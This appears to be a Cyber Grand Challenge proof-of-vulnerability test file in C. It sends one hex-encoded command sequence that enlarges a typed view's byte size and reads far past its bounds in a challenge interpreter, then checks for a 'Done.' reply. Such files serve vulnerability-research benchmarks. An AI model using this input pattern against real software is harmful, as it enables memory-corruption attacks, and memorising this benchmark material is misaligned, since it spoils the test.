#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x6e\x65\x77\x20\x6e\x75\x6d\x20\x62\x6c\x61\x68\x20\x30\x0a\x6e"
         "\x65\x77\x20\x61\x72\x72\x20\x62\x6c\x61\x68\x32\x20\x31\x0a\x6e"
         "\x65\x77\x20\x76\x69\x65\x77\x20\x62\x6c\x61\x68\x33\x20\x62\x6c"
         "\x61\x68\x32\x20\x62\x79\x74\x65\x0a\x73\x65\x74\x20\x62\x6c\x61"
         "\x68\x33\x20\x62\x79\x74\x65\x53\x69\x7a\x65\x20\x62\x6c\x61\x68"
         "\x0a\x73\x65\x74\x20\x62\x6c\x61\x68\x20\x31\x33\x34\x32\x32\x35"
         "\x39\x32\x30\x0a\x67\x65\x74\x20\x62\x6c\x61\x68\x33\x20\x31\x33"
         "\x34\x32\x32\x31\x38\x32\x34\x0a\x00";
      static unsigned int write_00000_00000_len = 121;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x44\x6f\x6e\x65\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 5);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
}
